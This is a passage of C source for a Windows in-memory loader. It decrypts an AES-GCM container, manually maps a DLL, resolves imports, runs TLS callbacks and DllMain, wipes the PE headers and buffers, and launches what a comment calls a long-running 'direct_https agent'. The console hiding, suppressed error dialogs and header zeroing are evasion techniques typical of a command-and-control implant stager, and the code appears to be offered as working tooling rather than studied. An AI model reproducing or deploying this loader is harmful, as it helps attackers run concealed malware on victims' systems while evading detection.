    DWORD i;
    SYSTEM_INFO si;
    DWORD page;
    const DHPL_SECTION* secs = (const DHPL_SECTION*)(container + h->sections_offset);
    GetSystemInfo(&si);
    page = si.dwPageSize ? si.dwPageSize : 0x1000;
    for (i = 0; i < h->section_count; i++) {
        const DHPL_SECTION* s = &secs[i];
        DWORD oldProtect = 0;
        DWORD start = align_down_dword(s->virtual_address, page);
        DWORD end = align_up_dword(s->virtual_address + s->virtual_size, page);
        DWORD size;
        if (end <= start) continue;
        if (!rva_range_ok(start, end - start, h->image_size)) {
            diag_log_num("DHPL_PROTECT_RANGE_ERROR_INDEX", i);
            return 0;
        }
        size = end - start;
        if (!VirtualProtect(image + start, size, s->protect, &oldProtect)) {
            diag_log_num("DHPL_PROTECT_ERROR_INDEX", i);
            return 0;
        }
    }
    return 1;
}

static int call_tls_callbacks(const unsigned char* container, const DHPL_HEADER* h, unsigned char* image)
{
    DWORD i;
    const DWORD* callbacks = (const DWORD*)(container + h->tls_offset);
    for (i = 0; i < h->tls_count; i++) {
        DWORD rva = callbacks[i];
        PIMAGE_TLS_CALLBACK cb;
        if (!rva_range_ok(rva, 1, h->image_size)) {
            diag_log_num("DHPL_TLS_RANGE_ERROR_INDEX", i);
            return 0;
        }
        cb = (PIMAGE_TLS_CALLBACK)(void*)(image + rva);
        diag_log_num("DHPL_TLS_CALLBACK_INDEX", i);
        cb((LPVOID)image, DLL_PROCESS_ATTACH, NULL);
    }
    return 1;
}

static int call_dllmain(const DHPL_HEADER* h, unsigned char* image)
{
    DllMainFn entry;
    if (!h->entry_point_rva) {
        diag_log("DHPL_DLLMAIN_NONE");
        return 1;
    }
    entry = (DllMainFn)(void*)(image + h->entry_point_rva);
    if (!entry((HINSTANCE)(void*)image, DLL_PROCESS_ATTACH, NULL)) {
        diag_log("DHPL_DLLMAIN_FALSE");
        return 0;
    }
    return 1;
}

static int zero_and_protect_headers(const DHPL_HEADER* h, unsigned char* image)
{
    SYSTEM_INFO si;
    DWORD page;
    DWORD headerSize;
    DWORD oldProtect = 0;
    GetSystemInfo(&si);
    page = si.dwPageSize ? si.dwPageSize : 0x1000;
    headerSize = h->size_of_headers ? h->size_of_headers : page;
    headerSize = align_up_dword(headerSize, page);
    if (headerSize > h->image_size) headerSize = page;
    SecureZeroMemory(image, headerSize);
    if (!VirtualProtect(image, headerSize, PAGE_READONLY, &oldProtect)) {
        diag_log("DHPL_HEADER_PROTECT_ERROR");
        return 0;
    }
    return 1;
}

static int run_loader(const char* containerPath, const char* key)
{
    unsigned char* encryptedFile = NULL;
    DWORD encryptedFileSize = 0;
    unsigned char* container = NULL;
    DWORD containerSize = 0;
    const DHPL_HEADER* h = NULL;
    unsigned char* image = NULL;
    RunAgentDllFn runAgent;
    DWORD runAgentRva = 0;
    DWORD rc;

    SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);
    FreeConsole();
    diag_log("DHPL_START");

    rc = (DWORD)read_file_winapi(containerPath, &encryptedFile, &encryptedFileSize);
    if (rc != 0) {
        diag_log_num("DHPL_READ_ERROR", rc);
        return 10;
    }
    diag_log_num("DHPL_READ_OK_SIZE", encryptedFileSize);

    if (!decrypt_envelope_aes_gcm(encryptedFile, encryptedFileSize, key, &container, &containerSize)) {
        heap_secure_free(encryptedFile, encryptedFileSize);
        return 20;
    }
    diag_log("DHPLE_DECRYPT_OK");
    heap_secure_free(encryptedFile, encryptedFileSize);
    encryptedFile = NULL;
    encryptedFileSize = 0;

    if (!validate_header(container, containerSize, &h)) {
        heap_secure_free(container, containerSize);
        return 30;
    }
    diag_log("DHPL_VALIDATE_OK");
    diag_log_hex64("DHPL_PREFERRED_BASE", h->preferred_base);
    diag_log_num("DHPL_IMAGE_SIZE", h->image_size);
    diag_log_num("DHPL_SECTION_COUNT", h->section_count);
    diag_log_num("DHPL_RELOC_COUNT", h->reloc_count);
    diag_log_num("DHPL_IMPORT_COUNT", h->import_count);
    diag_log_num("DHPL_TLS_COUNT", h->tls_count);
    diag_log_num("DHPL_RUN_AGENT_RVA", h->run_agent_rva);

    image = (unsigned char*)VirtualAlloc((LPVOID)(ULONG_PTR)h->preferred_base, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!image) {
        image = (unsigned char*)VirtualAlloc(NULL, h->image_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }
    if (!image) {
        diag_log("DHPL_ALLOC_ERROR");
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_ALLOC_OK");
    diag_log_hex64("DHPL_IMAGE_BASE", (ULONGLONG)(ULONG_PTR)image);

    if (!copy_sections(container, h, image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_SECTIONS_OK");

    if (!apply_relocations(container, h, image, (ULONGLONG)(ULONG_PTR)image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_RELOC_OK");

    if (!resolve_imports(container, h, image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 50;
    }
    diag_log("DHPL_IMPORT_OK");

    if (!register_exception_table(h, image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 50;
    }
    diag_log("DHPL_EXCEPTION_OK");

    if (!protect_sections(container, h, image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_PROTECT_OK");

    if (!call_tls_callbacks(container, h, image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 60;
    }
    diag_log("DHPL_TLS_OK");

    if (!call_dllmain(h, image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 60;
    }
    diag_log("DHPL_DLLMAIN_OK");

    if (!zero_and_protect_headers(h, image)) {
        VirtualFree(image, 0, MEM_RELEASE);
        heap_secure_free(container, containerSize);
        return 40;
    }
    diag_log("DHPL_HEADER_ZERO_OK");

    /*
     * 到这里为止，runtime 已经不需要 export table。
     * RunAgentDll 的地址来自 packer 写入 DHPL1 header 的 run_agent_rva。
     */
    runAgentRva = h->run_agent_rva;
    runAgent = (RunAgentDllFn)(void*)(image + runAgentRva);
    /*
     * 映射、reloc、import、TLS、DllMain 都完成后，DHPL1 明文容器也不再需要。
     * 这里主动把堆里的解密容器清零并释放，避免 loader 长时间运行时还留着
     * “section 原始数据 + DHPL1 metadata”的临时输入缓冲。
     */
    heap_secure_free(container, containerSize);
    container = NULL;
    containerSize = 0;
    h = NULL;
    diag_log("DHPL_CONTAINER_ZERO_OK");

    diag_log("DHPL_RUN_AGENT_BEGIN");
    rc = runAgent();
    diag_log_num("DHPL_RUN_AGENT_RC", rc);

    /*
     * v1 不做 graceful unload。正常 direct_https agent 是长循环，通常不会走到这里。
     * 如果真的返回，就释放容器密文缓冲；手动映射 image 留给进程退出时回收。
     */
    return (int)rc;
}

int main(int argc, char** argv)
{
    const char* containerPath = argc > 1 ? argv[1] : "cache.dhpl";
    char* ownedKey = NULL;
    const char* key = resolve_key_source(argc > 2 ? argv[2] : NULL, &ownedKey);
    int rc;
    touch_release_markers();
    g_log_path = argc > 3 ? argv[3] : NULL;
    if (!g_log_path || !g_log_path[0]) g_log_path = getenv("DHPL_LOADER_LOG");
    if (!key || !key[0]) {
        diag_log("DHPL_KEY_RESOLVE_ERROR");
        if (ownedKey) heap_secure_free((unsigned char*)ownedKey, (DWORD)strlen(ownedKey));
        return 5;
    }
    rc = run_loader(containerPath, key);
    if (ownedKey) heap_secure_free((unsigned char*)ownedKey, (DWORD)strlen(ownedKey));
    return rc;
}
